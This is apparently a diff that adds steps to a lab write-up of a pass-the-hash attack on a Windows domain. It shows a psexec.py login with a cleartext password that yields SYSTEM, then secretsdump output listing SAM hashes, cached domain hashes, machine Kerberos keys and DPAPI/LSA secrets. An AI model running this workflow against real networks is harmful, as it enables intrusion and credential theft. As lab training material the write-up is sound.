@@ -87,4 +87,127 @@ SMB         192.168.5.136   445    VICTIM-2         defaultuser0:1000:aad3b435b5
 SMB         192.168.5.136   445    VICTIM-2         karim:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
 SMB         192.168.5.136   445    VICTIM-2         [+] Added 6 SAM hashes to the database
 ```
-                                                                                              
+
+rahimkhan has local admin on both VICTIM-1 and VICTIM-2 — that's what (Pwn3d!) means. The DC logged in fine but no Pwn3d because domain controllers work differently with local admin.
+One thing to notice — VICTIM-1's Administrator and rahim have the exact same NT hash (64f12cdd...). VICTIM-2's karim has that same hash too. So all three accounts have the same password.
+
+<p align="center">
+  <img src="/writeups/pass the hash/images/step1-1.png" width="600">
+</p>
+
+I then tried psexec into VICTIM-1 using rahimkhan — that succeed:
+
+```bash
+psexec.py readteambd/rahimkhan:Password1@192.168.5.135
+```
+
+```
+[*] Found writable share ADMIN$
+[*] Uploading file 8Slpmu2.exe
+[*] Opening SVCManager on 192.168.5.135
+[*] Starting service vJfn
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> hostname
+Victim-1
+```
+
+<p align="center">
+  <img src="/writeups/pass the hash/images/step1-2.png" width="600">
+</p>
+
+I'm SYSTEM on VICTIM-1. Now I want to do a proper full hash dump.
+
+## Step 2 — Run secretsdump for Full Hash Dump
+
+CME already grabbed the SAM hashes, but secretsdump gives more — cached domain logins, LSA secrets, machine account keys. Ran it against both machines:
+
+VICTIM-1:
+
+```
+
+[*] Service RemoteRegistry is in stopped state
+[*] Service RemoteRegistry is disabled, enabling it
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0x6608255fec750bd36510ab28b84600b1
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58de7b52b01e171824c8aeaa55fb1a89:::
+rahim:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+[*] Dumping cached domain logon information (domain/username:hash)
+READTEAMBD.LOCAL/Administrator:$DCC2$10240#Administrator#e82d48bcd598cafade91e02c44001bcb
+READTEAMBD.LOCAL/rahimkhan:$DCC2$10240#rahimkhan#f3ae9b5061b3126512ee3dc3d5ad6736
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+READTEAMBD\VICTIM-1$:aes256-cts-hmac-sha1-96:14e03c91b7591eeadf3b1cc00424446695535d3ccfa0a17e15bc712270a90d76
+READTEAMBD\VICTIM-1$:aes128-cts-hmac-sha1-96:a29a72336c96029edac48f600795b1f0
+READTEAMBD\VICTIM-1$:des-cbc-md5:d67c382016f443b9
+READTEAMBD\VICTIM-1$:aad3b435b51404eeaad3b435b51404ee:a5fe1d0dc9eb932036cba4e74ff64bac:::
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0xe194f0486d5dc1ce67698f0f5ee9ac4bb2ea35ef
+dpapi_userkey:0x1280472b70f87a45367400a7ae2b8b8fc127e398
+[*] NL$KM 
+ 0000   4B 8F CA 52 BF 95 F1 83  BD 04 4D 00 F5 06 D9 A5   K..R......M.....
+ 0010   D7 AC C0 E8 E5 95 E9 3C  EA B7 40 AE 2E 58 3A FA   .......<..@..X:.
+ 0020   CB D8 30 18 5A 54 D3 22  51 11 9C 94 5D 1B DC 02   ..0.ZT."Q...]...
+ 0030   A4 11 1A AB C0 B3 BE A0  95 8E 40 B9 75 3D 49 A7   ..........@.u=I.
+NL$KM:4b8fca52bf95f183bd044d00f506d9a5d7acc0e8e595e93ceab740ae2e583afacbd830185a54d32251119c945d1bdc02a4111aabc0b3bea0958e40b9753d49a7
+[*] Cleaning up... 
+[*] Stopping service RemoteRegistry
+[*] Restoring the disabled state for service RemoteRegistry
+```
+<p align="center">
+  <img src="/writeups/pass the hash/images/step2-1.png" width="600">
+</p>
+
+
+VICTIM-2:
+```
+[*] Service RemoteRegistry is in stopped state
+[*] Service RemoteRegistry is disabled, enabling it
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0x26daf3e3d4c1f8aa07b2b91228d60a55
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6f3ff0667b23a61adbffbe71a1e8dd8b:::
+defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:337b1d18e8d0a8405c907048fdfbbae2:::
+karim:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+[*] Dumping cached domain logon information (domain/username:hash)
+READTEAMBD.LOCAL/Administrator:$DCC2$10240#Administrator#e82d48bcd598cafade91e02c44001bcb
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+READTEAMBD\VICTIM-2$:aes256-cts-hmac-sha1-96:988227393fdc3358ccfab5fe9c223e465c0e6cc7a2c924c080c430f667ee0fbf
+READTEAMBD\VICTIM-2$:aes128-cts-hmac-sha1-96:24c5e3a094f1ae6c51014e95e6f9e3fd
+READTEAMBD\VICTIM-2$:des-cbc-md5:efc180d354075820
+READTEAMBD\VICTIM-2$:aad3b435b51404eeaad3b435b51404ee:241691b698e90567f10688cbeb494357:::
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0xc9fe733ed67c2e131c76f5aae18a49435003e3b2
+dpapi_userkey:0x76579e18b9cafed8ddc74b135f34617eaea84a50
+[*] NL$KM 
+ 0000   C7 B7 B5 BD A0 D3 3E 86  62 BF FB 11 E1 89 9A B8   ......>.b.......
+ 0010   AA EB B5 B8 79 48 11 5F  CB EC C5 99 35 10 E8 60   ....yH._....5..`
+ 0020   44 27 D5 CB 0A D9 91 9A  F1 56 EF 17 23 30 69 0F   D'.......V..#0i.
+ 0030   DF 98 14 95 EC 51 7D 16  11 9E 12 61 6C 1C 28 CE   .....Q}....al.(.
+NL$KM:c7b7b5bda0d33e8662bffb11e1899ab8aaebb5b87948115fcbecc5993510e8604427d5cb0ad9919af156ef172330690fdf981495ec517d16119e12616c1c28ce
+[*] Cleaning up... 
+[*] Stopping service RemoteRegistry
+[*] Restoring the disabled state for service RemoteRegistry
+```
+<p align="center">
+  <img src="/writeups/pass the hash/images/step2-2.png" width="600">
+</p>
+
+## Step 3 — Put the Hashes in a File
+
+Opened a file and dropped in the hashes I want to crack and use:
+
+```bash
+nano passthehash.txt
+```
+                                                                                
